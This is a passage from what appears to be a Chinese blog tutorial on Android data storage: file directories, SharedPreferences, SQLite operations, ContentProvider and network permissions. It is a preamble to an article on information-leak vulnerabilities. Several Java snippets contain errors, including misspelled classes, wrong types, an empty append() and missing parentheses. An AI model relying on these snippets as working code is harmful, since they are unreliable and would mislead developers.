4.4以上，不需要注册和用户授权SD读写的权限，就可以在应用的私有目录进行读写文件，文件不能被其他应用访问，用户删除应用时，对应的应用的私有目录也会被删除</p>\n<p>私有目录地址：<code>/storage/emulated/0/Android/data/packagename</code></p>\n<p>相关API:</p>\n<p>私有目录访问的API都在<code>ContextWrapper</code>对象上，可以直接通过Activity或Context进行调用</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">getExternalCacheDir()： 访问/storage/emulated/0/Android/data/应用包名/cache目录，该目录用来存放应用的缓存文件，当我们通过应用删除缓存文件的时候，该目录下的文件会被清除</span><br><span class=\"line\">getExternalFilesDir(): 访问/storage/emulated/0/Android/data/应用包名/files 目录,该目录用来存放应用的数据</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"lt-2-gt-公共目录\"><a href=\"#lt-2-gt-公共目录\" class=\"headerlink\" title=\"&lt;2&gt; 公共目录\"></a>&lt;2&gt; 公共目录</h5><p>公共目录必须需要用户授权读写的权限，就意味需要在<code>AndroidManifest.xml</code>中注册用户权限</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">&lt;!-- 往SDCard写入数据权限 --&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">uses-permission</span> <span class=\"attr\">android:name</span>=<span class=\"string\">&quot;android.permission.WRITE_EXTERNAL_STORAGE&quot;</span> /&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">uses-permission</span> <span class=\"attr\">android:name</span>=<span class=\"string\">&quot;android.permission.READ_EXTERNAL_STORAGE&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>Android 6.0系统之后需要申请用户权限，并获得用户授权，才能读写文件，公共目录相对开放，我们可以访问其他APP存在公共目录下的文件，并且当APP被删除时，并不会删除应用存在公共目录下的文件</p>\n<p>相关API:</p>\n<p>公共目录可以通过Environment对象，访问读写公共目录的文件</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">Environment.getExternalStorageDirectory() 访问外部存储设备公共根目录</span><br><span class=\"line\">Environment.getExternalStorageState() 获得外部存储SD卡的状态</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"（3）系统存储目录\"><a href=\"#（3）系统存储目录\" class=\"headerlink\" title=\"（3）系统存储目录\"></a>（3）系统存储目录</h5><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">getRootDirectory()：对应获取系统分区根路径:/system</span><br><span class=\"line\"><span class=\"title function_\">getDataDirectory</span><span class=\"params\">()</span>：对应获取用户数据目录路径:/data</span><br><span class=\"line\"><span class=\"title function_\">getDownloadCacheDirectory</span><span class=\"params\">()</span>：对应获取用户缓存目录路径:/cache</span><br></pre></td></tr></table></figure>\n\n<p>补充：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">（<span class=\"number\">1</span>）升级应用程序后的apk文件在哪？</span><br><span class=\"line\">一般我们从服务器端下载的app需要放到外部存储目录下面，而不是内部存储目录，即/storage/emulated/<span class=\"number\">0</span>/Android/data/packagename下</span><br><span class=\"line\">（<span class=\"number\">2</span>）清除数据和清除缓存的区别？</span><br><span class=\"line\">清除数据清除的是保存在app中所有数据，就是上面提到的位于packagename下面的所有文件，包含内部存储(/data/data/packagename/)和外部存储(/storage/emulated/<span class=\"number\">0</span>/Android/data/packagename/)，但不会影响SD卡的数据</span><br><span class=\"line\">缓存是程序运行时的临时存储空间，缓存文件存放在getCacheDir()或者 getExternalCacheDir()路径下</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"（4）文件存储的读写方式\"><a href=\"#（4）文件存储的读写方式\" class=\"headerlink\" title=\"（4）文件存储的读写方式\"></a>（4）文件存储的读写方式</h4><p>写入文件：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">save</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">      <span class=\"type\">String</span> <span class=\"variable\">data</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;Data to save&quot;</span>;</span><br><span class=\"line\">      <span class=\"type\">FileOutputStream</span> <span class=\"variable\">out</span> <span class=\"operator\">=</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\">      <span class=\"type\">ButteredWriter</span> <span class=\"variable\">writer</span> <span class=\"operator\">=</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\">      <span class=\"keyword\">try</span>&#123;</span><br><span class=\"line\">            out = openFileOutput(<span class=\"string\">&quot;data&quot;</span>,Context.MODE_PRIVATE);  <span class=\"comment\">//MODE_PRIVATE（默认）：覆盖、MODE_APPEND：追加</span></span><br><span class=\"line\">            writer = <span class=\"keyword\">new</span> <span class=\"title class_\">ButteredWriter</span>(<span class=\"keyword\">new</span> <span class=\"title class_\">OutputSreamWriter</span>(out));</span><br><span class=\"line\">            writer.write(data);</span><br><span class=\"line\">      &#125;<span class=\"keyword\">catch</span>(IOException e)&#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">      &#125;<span class=\"keyword\">finally</span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">try</span>&#123;</span><br><span class=\"line\">                  <span class=\"keyword\">if</span>(writer!=<span class=\"literal\">null</span>)&#123;</span><br><span class=\"line\">                        writer.close();</span><br><span class=\"line\">                  &#125;</span><br><span class=\"line\">            &#125;<span class=\"keyword\">catch</span>(IOException e)&#123;</span><br><span class=\"line\">                  e.printStackTrace();</span><br><span class=\"line\">       &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>读取文件：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> String <span class=\"title function_\">load</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">      <span class=\"type\">FileInputStream</span> <span class=\"variable\">in</span> <span class=\"operator\">=</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\">      <span class=\"type\">ButteredReader</span> <span class=\"variable\">reader</span> <span class=\"operator\">=</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\">      <span class=\"type\">StringBuilder</span> <span class=\"variable\">builder</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">StringBuilder</span>();</span><br><span class=\"line\">      <span class=\"keyword\">try</span>&#123;</span><br><span class=\"line\">            in = openFileInput(<span class=\"string\">&quot;data&quot;</span>);</span><br><span class=\"line\">            reader = <span class=\"keyword\">new</span> <span class=\"title class_\">ButteredReader</span>(<span class=\"keyword\">new</span> <span class=\"title class_\">InputStreamReader</span>(in));</span><br><span class=\"line\">            String line= <span class=\"string\">&quot;&quot;</span>;</span><br><span class=\"line\">            <span class=\"keyword\">while</span>((line = reader.readline()) != <span class=\"literal\">null</span>)&#123;</span><br><span class=\"line\">                   builder.append();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">      &#125;<span class=\"keyword\">catch</span>(IOException e)&#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">      &#125;<span class=\"keyword\">finally</span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(reader != <span class=\"literal\">null</span>)&#123;</span><br><span class=\"line\">                    <span class=\"keyword\">try</span>&#123;</span><br><span class=\"line\">                          reader.close();</span><br><span class=\"line\">                    &#125;<span class=\"keyword\">catch</span>(IOException e)&#123;</span><br><span class=\"line\">                          e.printStackTrace();</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">             &#125;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-SharedPreferences\"><a href=\"#2-SharedPreferences\" class=\"headerlink\" title=\"2.SharedPreferences\"></a>2.SharedPreferences</h3><p>SharedPreference是Android平台上一个轻量级的存储类，主要是保存一些常用的配置比如窗口状态，是使用键值对的方式来存储数据，这样就可以支持多种不同的数据类型存储，进行数据持久化就会比文件方便很多</p>\n<p>默认存储路径：<code>/data/data/packageName/shared_prefs</code></p>\n<p>获取SharedPreferences对象的方法</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">Context的getSharedPreferences()方法，参数一是文件名，参数二是操作模式</span><br><span class=\"line\">Activity的getPreferences()方法，参数为操作模式，使用当前应用程序包名为文件名</span><br><span class=\"line\">PreferenceManager的getDefaultSharedPreferences()静态方法，接收Context参数，使用当前应用程序包名为文件名</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"（1）SharedPreferences数据的存取\"><a href=\"#（1）SharedPreferences数据的存取\" class=\"headerlink\" title=\"（1）SharedPreferences数据的存取\"></a>（1）SharedPreferences数据的存取</h4><p>SharedPreference的存储：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">(<span class=\"number\">1</span>)根据Context获取SharedPreferences对象</span><br><span class=\"line\">(<span class=\"number\">2</span>)利用edit()方法获取Editor对象</span><br><span class=\"line\">(<span class=\"number\">3</span>)ditor对象存储key-value键值对数据</span><br><span class=\"line\">(<span class=\"number\">4</span>)apply()提交数据</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">MainActivity</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">Activity</span> &#123;     </span><br><span class=\"line\"> <span class=\"meta\">@Override</span> </span><br><span class=\"line\">     <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">onCreate</span><span class=\"params\">(Bundle savedInstanceState)</span> &#123; </span><br><span class=\"line\">        <span class=\"built_in\">super</span>.onCreate(savedInstanceState); </span><br><span class=\"line\">        setContentView(R.layout.main); </span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">//获取SharedPreferences对象 </span></span><br><span class=\"line\">        <span class=\"type\">Context</span> <span class=\"variable\">ctx</span> <span class=\"operator\">=</span> MainActivity.<span class=\"built_in\">this</span>;        </span><br><span class=\"line\">        <span class=\"type\">SharedPreferences</span> <span class=\"variable\">sp</span> <span class=\"operator\">=</span> ctx.getSharedPreferences(<span class=\"string\">&quot;SP&quot;</span>, MODE_PRIVATE); <span class=\"comment\">//MODE_PRIVATE（默认）：只有当前的应用程序才能对文件进行读写、MODE_MULTI_PROCESS：用于多个进程对同一个SharedPreferences进行读写</span></span><br><span class=\"line\">        <span class=\"comment\">//存入数据 </span></span><br><span class=\"line\">        <span class=\"type\">Editor</span> <span class=\"variable\">editor</span> <span class=\"operator\">=</span> sp.edit(); </span><br><span class=\"line\">        editor.putString(<span class=\"string\">&quot;name&quot;</span>, <span class=\"string\">&quot;Tom&quot;</span>); </span><br><span class=\"line\">        editor.putInt(<span class=\"string\">&quot;age&quot;</span>, <span class=\"number\">28</span>); </span><br><span class=\"line\">        editor.putBoolean(<span class=\"string\">&quot;married&quot;</span>, <span class=\"literal\">true</span>); </span><br><span class=\"line\">        editor.apply(); </span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">//返回STRING_KEY的值 </span></span><br><span class=\"line\">        Log.d(<span class=\"string\">&quot;SP&quot;</span>, sp.getString(<span class=\"string\">&quot;name&quot;</span>, <span class=\"string\">&quot;none&quot;</span>)); </span><br><span class=\"line\">        <span class=\"comment\">//如果NOT_EXIST不存在，则返回值为&quot;none&quot; </span></span><br><span class=\"line\">        Log.d(<span class=\"string\">&quot;SP&quot;</span>, sp.getString(<span class=\"string\">&quot;NOT_EXIST&quot;</span>, <span class=\"string\">&quot;none&quot;</span>)); </span><br><span class=\"line\">     &#125; </span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>SharedPreference数据的读取：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">SharedPreferences</span> <span class=\"variable\">pref</span> <span class=\"operator\">=</span> getSharedPreferences(<span class=\"string\">&quot;data&quot;</span>,MODE_PRIVATE);</span><br><span class=\"line\"><span class=\"type\">String</span> <span class=\"variable\">name</span> <span class=\"operator\">=</span> pref.getString(<span class=\"string\">&quot;name&quot;</span>);</span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"variable\">age</span> <span class=\"operator\">=</span> pref.getInt(<span class=\"string\">&quot;age&quot;</span>);</span><br><span class=\"line\"><span class=\"type\">boolean</span> <span class=\"variable\">isMarried</span> <span class=\"operator\">=</span> pref.getBoolean(<span class=\"string\">&quot;isMarried&quot;</span>);</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"3-SQLite数据库存储\"><a href=\"#3-SQLite数据库存储\" class=\"headerlink\" title=\"3. SQLite数据库存储\"></a>3. SQLite数据库存储</h3><p>SharedPreferences对象与SQLite数据库相比，免去了创建数据库、创建表、写SQL语句等操作，但是其只能存储boolean，int，float，long和String五种简单的数据类型，而且SharedPreferences是以明文的形式存储密钥信息，往往存在一定的安全隐患。为此Android还提供了一个轻量级的数据库SQLite数据库，SQLite是轻量级嵌入式数据库引擎，它支持 SQL 语言，并且只利用很少的内存就有很好的性能</p>\n<p>默认存储路径：<code>/data/data/packagename/databases</code></p>\n<h4 id=\"（1）数据库的创建\"><a href=\"#（1）数据库的创建\" class=\"headerlink\" title=\"（1）数据库的创建\"></a>（1）数据库的创建</h4><p>Android 提供了SQLiteOpenHelper类帮助创建和升级数据库，SQLiteOpenHelper子类至少需要实现三个方法：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1.</span>构造函数，调用父类SQLiteOpenHelper的构造函数。需要四个参数（上下文环境、数据库名称、查询数据的游标Cursor(通常为<span class=\"literal\">null</span>)、当前数据库的版本号）</span><br><span class=\"line\"><span class=\"number\">2.</span>onCreate（）方法，它需要一个 SQLiteDatabase 对象作为参数，根据需要对这个对象填充表和初始化数据</span><br><span class=\"line\"><span class=\"number\">3.</span>onUpgrage() 方法，它需要三个参数，一个 SQLiteDatabase 对象，一个旧的版本号和一个新的版本号，这样就可以方便的实现数据库的升级</span><br></pre></td></tr></table></figure>\n\n<p>继承 SQLiteOpenHelper 创建数据库</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">MyDatabaseHelper</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">SQLiteOpenHelper</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">//1.构造方法</span></span><br><span class=\"line\">  MyDatabaseHelper(Context context, String name, CursorFactory cursorFactory, <span class=\"type\">int</span> version)  </span><br><span class=\"line\">  &#123;      </span><br><span class=\"line\">    <span class=\"built_in\">super</span>(context, name, cursorFactory, version);      </span><br><span class=\"line\">     &#125;      </span><br><span class=\"line\"></span><br><span class=\"line\">     <span class=\"meta\">@Override</span>     </span><br><span class=\"line\">     <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">onCreate</span><span class=\"params\">(SQLiteDatabase db)</span> &#123;      </span><br><span class=\"line\">         <span class=\"comment\">// TODO 创建数据库后，对数据库的操作      </span></span><br><span class=\"line\">     &#125;      </span><br><span class=\"line\"></span><br><span class=\"line\">     <span class=\"meta\">@Override</span>     </span><br><span class=\"line\"> <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">onUpgrade</span><span class=\"params\">(SQLiteDatabase db, <span class=\"type\">int</span> oldVersion, <span class=\"type\">int</span> newVersion)</span> &#123;      </span><br><span class=\"line\">         <span class=\"comment\">// TODO 升级数据库版本 </span></span><br><span class=\"line\">     &#125;      </span><br><span class=\"line\"></span><br><span class=\"line\"> <span class=\"meta\">@Override</span>     </span><br><span class=\"line\"> <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">onOpen</span><span class=\"params\">(SQLiteDatabase db)</span> &#123;      </span><br><span class=\"line\">         <span class=\"built_in\">super</span>.onOpen(db);        </span><br><span class=\"line\">         <span class=\"comment\">// TODO 每次成功打开数据库后首先被执行      </span></span><br><span class=\"line\">     &#125;      </span><br><span class=\"line\"> &#125;</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"（2）数据库的更新\"><a href=\"#（2）数据库的更新\" class=\"headerlink\" title=\"（2）数据库的更新\"></a>（2）数据库的更新</h4><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">MyDatabaseHelper</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">SQLiteOpenHelper</span>&#123;  </span><br><span class=\"line\">    ......</span><br><span class=\"line\">    <span class=\"comment\">//当打开数据库时传入的版本号与当前的版本号不同时会调用该方法  </span></span><br><span class=\"line\">    <span class=\"meta\">@Override</span>  </span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">onUpgrade</span><span class=\"params\">(SQLiteDatabase db, <span class=\"type\">int</span> oldVersion, <span class=\"type\">int</span> newVersion)</span> &#123;   </span><br><span class=\"line\">          db.execSQL(<span class=\"string\">&quot;drop table if exists Book&quot;</span>);</span><br><span class=\"line\">          onCreate(db):</span><br><span class=\"line\">    &#125;    </span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n\n<p>只要我们在MainActivity中将version改为大于原来版本号，就可以让<code>onUpgrade()</code>方法得到执行</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">MyDatabaseHelper</span> <span class=\"variable\">helper</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">MyDatabaseHelper</span>(<span class=\"built_in\">this</span>,<span class=\"string\">&quot;BookStore.db&quot;</span>,<span class=\"literal\">null</span>,<span class=\"number\">2</span>);</span><br><span class=\"line\">helper.getWritableDatabase(); </span><br></pre></td></tr></table></figure>\n\n<h4 id=\"（3）数据库的基本操作\"><a href=\"#（3）数据库的基本操作\" class=\"headerlink\" title=\"（3）数据库的基本操作\"></a>（3）数据库的基本操作</h4><p>添加数据：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">SQLiteDatabase</span> <span class=\"variable\">db</span> <span class=\"operator\">=</span> helper.getWritableDatabase();</span><br><span class=\"line\"><span class=\"type\">ContentValues</span> <span class=\"variable\">values</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ContentValues</span>();</span><br><span class=\"line\">values.put(<span class=\"string\">&quot;name&quot;</span>,<span class=\"string\">&quot;The Book Name&quot;</span>);</span><br><span class=\"line\">values.put(<span class=\"string\">&quot;author&quot;</span>,<span class=\"string\">&quot;chen&quot;</span>);</span><br><span class=\"line\">values.put(<span class=\"string\">&quot;pages&quot;</span>,<span class=\"number\">100</span>);</span><br><span class=\"line\">values.put(<span class=\"string\">&quot;price&quot;</span>,<span class=\"number\">200</span>);</span><br><span class=\"line\">db.insert(<span class=\"string\">&quot;Book&quot;</span>,<span class=\"literal\">null</span>,values);<span class=\"comment\">//参数一 表名 参数二 未指定添加数据的情况下为NULL 参数三 ContentValues对象</span></span><br></pre></td></tr></table></figure>\n\n<p>更新数据：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">SQLiteDatabase</span> <span class=\"variable\">db</span> <span class=\"operator\">=</span> helper.getWritableDatabase();</span><br><span class=\"line\"><span class=\"type\">ContentValues</span> <span class=\"variable\">values</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ContentValues</span>();</span><br><span class=\"line\">values.put(<span class=\"string\">&quot;price&quot;</span>,<span class=\"number\">120</span>);</span><br><span class=\"line\">db.update(<span class=\"string\">&quot;Book&quot;</span>,values,<span class=\"string\">&quot;name= ?&quot;</span>,<span class=\"keyword\">new</span> <span class=\"title class_\">String</span>[]&#123;<span class=\"string\">&quot;The Book Name&quot;</span>&#125;);  <span class=\"comment\">//参数一 表名 参数二 ContentValues对象 参数三、四是去约束更新某一行或某几行的数据，不指定默认更新所有</span></span><br></pre></td></tr></table></figure>\n\n<p>删除数据：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">SQLiteDatabase</span> <span class=\"variable\">db</span> <span class=\"operator\">=</span> helper.getWritableDatabase();</span><br><span class=\"line\">db.delete(<span class=\"string\">&quot;Book&quot;</span>,<span class=\"string\">&quot;pages&gt; ?&quot;</span>,<span class=\"keyword\">new</span> <span class=\"title class_\">String</span>[]&#123;<span class=\"string\">&quot;100&quot;</span>&#125;); <span class=\"comment\">//参数一是表名，参数二、三是去约束删除某一行或某几行的数据，不指定默认删除所有</span></span><br></pre></td></tr></table></figure>\n\n<p>查询数据：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">SQLiteDatabase</span> <span class=\"variable\">db</span> <span class=\"operator\">=</span> helper.getWritableDatabase();</span><br><span class=\"line\"><span class=\"comment\">//query()方法，参数一是表名，参数二是指定查询哪几列，默认全部，参数三、四是去约束查询某一行或某几行的数据，不指定默认查询所有，参数五是用于指定需要去group by的列，参数六是对group by的数据进一步的过滤，参数七是查询结果的排序方式</span></span><br><span class=\"line\"><span class=\"type\">Cursor</span> <span class=\"variable\">cursor</span> <span class=\"operator\">=</span> db.query(<span class=\"string\">&quot;Book&quot;</span>,<span class=\"literal\">null</span>,<span class=\"literal\">null</span>,<span class=\"literal\">null</span>,<span class=\"literal\">null</span>,<span class=\"literal\">null</span>,<span class=\"literal\">null</span>);</span><br><span class=\"line\"><span class=\"keyword\">if</span>(cursor.moveToFirst())&#123;</span><br><span class=\"line\">      <span class=\"keyword\">do</span>&#123;</span><br><span class=\"line\">            <span class=\"type\">String</span> <span class=\"variable\">name</span> <span class=\"operator\">=</span> cursor.getString(cursor.getColumnIndex(<span class=\"string\">&quot;name&quot;</span>);</span><br><span class=\"line\">            <span class=\"type\">String</span> <span class=\"variable\">author</span> <span class=\"operator\">=</span> cursor.getString(cursor.getColumnIndex(<span class=\"string\">&quot;author&quot;</span>);</span><br><span class=\"line\">            <span class=\"type\">int</span> <span class=\"variable\">pages</span> <span class=\"operator\">=</span> cursor.getString(cursor.getColumnIndex(<span class=\"string\">&quot;pages&quot;</span>);</span><br><span class=\"line\">            <span class=\"type\">double</span> <span class=\"variable\">price</span> <span class=\"operator\">=</span> cursor.getString(cursor.getColumnIndex(<span class=\"string\">&quot;price&quot;</span>);</span><br><span class=\"line\">       &#125;<span class=\"keyword\">while</span>(cursor.moveToNext());</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">cursor.close();</span><br></pre></td></tr></table></figure>\n\n<p>SQL语句操作数据库：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//添加数据</span></span><br><span class=\"line\">db.execSQL(<span class=\"string\">&quot;insert into Book(name,author,pages,price) values(?,?,?,?) &quot;</span></span><br><span class=\"line\">            ,<span class=\"keyword\">new</span> <span class=\"title class_\">String</span>[]&#123;<span class=\"string\">&quot;The Book Name&quot;</span>,<span class=\"string\">&quot;chen&quot;</span>,<span class=\"number\">100</span>,<span class=\"number\">20</span>&#125;);</span><br><span class=\"line\"><span class=\"comment\">//更新数据</span></span><br><span class=\"line\">db.execSQL(<span class=\"string\">&quot;update Book set price = ? where name = ?&quot;</span>,<span class=\"keyword\">new</span> <span class=\"title class_\">String</span>[]</span><br><span class=\"line\">            &#123;<span class=\"string\">&quot;10&quot;</span>,<span class=\"string\">&quot;The Book Name&quot;</span>&#125;);</span><br><span class=\"line\"><span class=\"comment\">//删除数据</span></span><br><span class=\"line\">db.execSQL(<span class=\"string\">&quot;delete from Book where pages &gt; ?&quot;</span>,<span class=\"keyword\">new</span> <span class=\"title class_\">String</span>[]&#123;<span class=\"string\">&quot;100&quot;</span>&#125;);</span><br><span class=\"line\"><span class=\"comment\">//查询数据</span></span><br><span class=\"line\">db.execSQL(<span class=\"string\">&quot;select * from Book&quot;</span>,<span class=\"literal\">null</span>);</span><br></pre></td></tr></table></figure>\n\n<p>使用事务操作：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">SQLiteDatabase</span> <span class=\"variable\">db</span> <span class=\"operator\">=</span> helper.getWritableDatabase();</span><br><span class=\"line\">db.beginTransaction();  <span class=\"comment\">//开启事务</span></span><br><span class=\"line\"><span class=\"keyword\">try</span>&#123;</span><br><span class=\"line\">      ......</span><br><span class=\"line\">      db.insert(<span class=\"string\">&quot;Book&quot;</span>,<span class=\"literal\">null</span>,values);</span><br><span class=\"line\">      db.setTransactionSuccessful();  <span class=\"comment\">//事务成功执行</span></span><br><span class=\"line\">&#125;<span class=\"keyword\">catch</span>(SQLException e)&#123;</span><br><span class=\"line\">      e.printStackTrace();</span><br><span class=\"line\">&#125;<span class=\"keyword\">finally</span>&#123;</span><br><span class=\"line\">      db.endTransaction();  <span class=\"comment\">//结束事务</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>当然Android数据库中还包括<code>LitePal</code>数据库更加方便的操作，由于本文主要是介绍漏洞，所以这里就简单介绍到这里</p>\n<h3 id=\"4-ContentProvider\"><a href=\"#4-ContentProvider\" class=\"headerlink\" title=\"4. ContentProvider\"></a>4. ContentProvider</h3><p>前面三种方式是Android中基本的存储方式，但是由于都存在一个公共的缺点：不能实现不同应用程序之间进行数据共享，大家都知道Android是采用沙箱的管理机制，不同的应用程序之间都是独立隔离开的，这一定程度上也是为了Android 应用之间的安全性考虑，但是如果应用之间不能很好的进行交互，那么很显然就带来了明显的不便，因此为了解决这个问题，内容提供器——ContentProvider就孕育而生了，由于前面我们有专门的章节讲述这一组件，所以本文只是简单描述，不详细了解，请参考<a href=\"https://bbs.pediy.com/thread-269447.htm\">Android APP漏洞之战（4）——Content Provider漏洞详解</a></p>\n<p>主要作用：用于不同的程序之间实现数据共享的功能，并通过ContentResolver进行操作</p>\n<p>ContentResolver使用方法：</p>\n<p>（1）内容URI</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//包名为com.example.app的表table1访问路径</span></span><br><span class=\"line\"><span class=\"type\">Uri</span> <span class=\"variable\">uri</span>  <span class=\"operator\">=</span> Uri.parse(<span class=\"string\">&quot;content://com.example.app.provider/table1&quot;</span>);</span><br></pre></td></tr></table></figure>\n\n<p>（2）使用URI对象进行数据操作</p>\n<p><strong>查询</strong></p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">Cursor</span> <span class=\"variable\">cursor</span> <span class=\"operator\">=</span> getContentResolver().query(uri,<span class=\"literal\">null</span>,<span class=\"literal\">null</span>,<span class=\"literal\">null</span>,<span class=\"literal\">null</span>);</span><br><span class=\"line\"><span class=\"keyword\">if</span>(cursor != <span class=\"literal\">null</span>)&#123;</span><br><span class=\"line\">      <span class=\"keyword\">while</span>(cursor.moveToNext())&#123;</span><br><span class=\"line\">            <span class=\"type\">String</span> <span class=\"variable\">column1</span> <span class=\"operator\">=</span> cursor.getString(cursor.getColumnIndex(<span class=\"string\">&quot;column1&quot;</span>));</span><br><span class=\"line\">            <span class=\"type\">String</span> <span class=\"variable\">column2</span> <span class=\"operator\">=</span> cursor.getString(cursor.getColumnIndex(<span class=\"string\">&quot;column2&quot;</span>));</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      cursor.close();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><strong>插入</strong></p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">ContentValues</span> <span class=\"variable\">values</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ContentValues</span>();</span><br><span class=\"line\">values.put(<span class=\"string\">&quot;column1&quot;</span>,<span class=\"string\">&quot;text&quot;</span>);</span><br><span class=\"line\">values.put(<span class=\"string\">&quot;column2&quot;</span>,<span class=\"number\">1</span>);</span><br><span class=\"line\">getContentResolver().insert(uri,values);</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"5-网络存储\"><a href=\"#5-网络存储\" class=\"headerlink\" title=\"5.网络存储\"></a>5.网络存储</h3><p>Android网络存储主要是通过网络来实现数据的存储和获取，这里主要调用WebService返回的数据或是解析HTTP协议实现网络数据交互，具体需要熟悉java.net.*，Android.net.*这两个包的内容，因为不是Android的主流存储方式，这里主要参考相应文档即可，也不是本文漏洞所关注的主要对象，就不做过多叙述了</p>\n<p>网络存储需要开启权限：</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">uses-permission</span> <span class=\"attr\">android:name</span>=<span class=\"string\">&quot;android.permission.INTERNET&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>具体可参考本文参考文献</p>\n<h2 id=\"三、信息泄露漏洞的安全场景和分类\"><a href=\"#三、信息泄露漏洞的安全场景和分类\" class=\"headerlink\" title=\"三、信息泄露漏洞的安全场景和分类\"></a>三、信息泄露漏洞的安全场景和分类</h2><h3 id=\"1-漏洞的安全场景\"><a href=\"#1-漏洞的安全场景\" class=\"headerlink\" 